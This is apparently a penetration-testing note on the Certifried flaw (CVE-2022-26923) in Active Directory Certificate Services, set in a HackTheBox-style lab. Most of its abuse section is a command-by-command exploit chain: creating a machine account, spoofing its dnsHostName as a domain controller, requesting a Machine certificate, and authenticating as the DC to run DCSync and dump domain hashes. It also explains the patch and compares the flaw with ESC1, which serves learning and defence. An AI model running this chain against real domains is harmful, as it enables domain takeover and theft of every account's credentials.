- Certifreid CVE, was about changing the computer DNSHostName to target computer/DC but without putting service so instead of `cifs/DC01` we will put the DNShostName as DC01 only so that don't trigger violation error then we request machine template that will give us the rights of `DC01`.

---
## Overview
### The Logic Flaw: DNSHostName vs. SPN

The core of Certifried lies in the discrepancy between how AD validates the `servicePrincipalName` (SPN) and the `dnsHostName` attribute.
1. **The SPN Restriction:** AD prevents a standard user from adding an SPN that conflicts with another object (e.g., you can't add `HOST/DC01.lab.local` to your machine account because it already exists on the Domain Controller).
2. **The DNSHostName Loophole:** Before the patch, AD did **not** strictly enforce uniqueness for the `dnsHostName` attribute for users with "Validated write to DNS host name" (which computer accounts have for themselves).
3. **The Certificate Mapping:** When a computer requests a certificate using a template like **Machine** or **User**, the CA looks at the `dnsHostName` of the requesting account and puts that value into the **Subject Alternative Name (SAN)** of the certificate.

By changing your computer's `dnsHostName` to match the Domain Controller's FQDN, you trick the CA into issuing you a certificate that identifies you as the DC.

---
## Enumeration
### Linux
Request any normal certificate to enumerate this vulnerability.
```shell
[*] Request ID is 4
[*] Got certificate with UPN 'blwasp@lab.local'
[*] Certificate has no object SID # <------ 
```


---

## Abuse
### Linux
#### Manual
```sh
# 1. Create new computer. Yet we didn't set DnsHostName
addcomputer.py -computer-name 'CERTIFRIED$' -computer-pass 'Password123!' -dc-ip 10.129.228.134 'LAB.LOCAL/Blwasp':'Password123!'

# 2. Specify the target DnsHostName and change the created computer DnsHostName to it.
python3 powerview.py lab.local/BlWasp:'Password123!'@10.129.228.134
> Set-DomainObject -Identity 'CERTIFRIED$' -Set dnsHostName="dc02.lab.local"

# 3. Request certificate. This will give you rights of the target machine
certipy req -u 'CERTIFRIED$' -p 'Password123!' -dc-ip 10.129.228.134 -ca lab-LAB-DC-CA -template 'Machine'

# 4. authenticate
certipy auth -pfx dc02.pfx
```
#### Easier
```shell
# Create computer and change its DnsHostName
certipy account create -u 'blwasp@lab.local' -p 'Password123!' -dc-ip 10.129.228.134 -user NEWMACHINE -dns DC02.LAB.LOCAL
certipy req -u 'NEWMACHINE$' -p 'ikFRmm6VMXcjmD5T' -ca lab-LAB-DC-CA -template 'Machine' -dc-ip 10.129.228.134
```

### PowerShell
In a HackTheBox environment, you can perform this using native PowerShell or tools like `Powermad`. Here is the sequence:
#### 1. Create a Machine Account
If you have the `MachineAccountQuota`, you can create one.
```powershell
# Using Powermad to create a new computer account
New-MachineAccount -MachineAccount 'FAKE-DC' -Password 'Password123!'
```
#### 2. Update the dnsHostName
This is the "magic" step. We change the `dnsHostName` of our new account to match the target DC’s FQDN. We must ensure we don't trigger SPN updates that would fail.
```powershell
# Set the dnsHostName to the target DC's name
Set-ADComputer -Identity 'FAKE-DC' -ServicePrincipalName @{Remove="HOST/FAKE-DC.lab.local","RestrictedKrbHost/FAKE-DC.lab.local"}
Set-ADComputer -Identity 'FAKE-DC' -DNSHostName 'DC01.lab.local'
```
#### 3. Request the Certificate
Now, we request a certificate using the **Machine** template. Because the `dnsHostName` is now `DC01.lab.local`, the CA will embed that identity into the certificate.
```powershell
# You would typically use a tool like Certipy or a custom script to 
# request the cert specifically for the 'FAKE-DC' account context
# Example using Certipy (Kali) for the actual enrollment:
# certipy req -u 'FAKE-DC$' -p 'Password123!' -ca 'LAB-CA' -template Machine -target 'DC01.lab.local'
```
#### 4. Authenticate as the DC
Once you have the `.pfx` certificate, you authenticate via Kerberos (PKINIT).
```powershell
# Authenticate to get a TGT for the DC01$ account
# certipy auth -pfx dc01.pfx -dc-ip 10.10.10.10
```

With the DC's TGT, you can perform a **DCSync** and dump the entire domain's hashes.



---

## The Patch (KB5014754)

Microsoft patched this by:

1. **Restricting Attributes:** Ensuring `dnsHostName` and `userPrincipalName` are unique and harder to spoof.    
2. **Strong Mapping:** This is what we discussed earlier with **ESC16**. The CA now embeds the **objectSid** of the requester into a new extension in the certificate. Even if the name matches the DC, the DC will see the SID of `FAKE-DC$` and reject the login as the Administrator.
### Comparison: Certifried (CVE-2022-26923) vs. ESC1

| **Feature**            | **Certifried**                          | **ESC1**                                                  |
| ---------------------- | --------------------------------------- | --------------------------------------------------------- |
| **Source of Trust**    | Vulnerable AD attribute logic           | Misconfigured Template                                    |
| **Who Supplies Name?** | The CA pulls it from AD (`dnsHostName`) | The Attacker provides it in the CSR                       |
| **Attribute Abused**   | `dnsHostName`                           | `msPKI-Certificate-Name-Flag` (Enrollee Supplies Subject) |

Would you like to see how to detect if the **Strong Mapping** (the patch for this) is currently being enforced on a Domain Controller using PowerShell?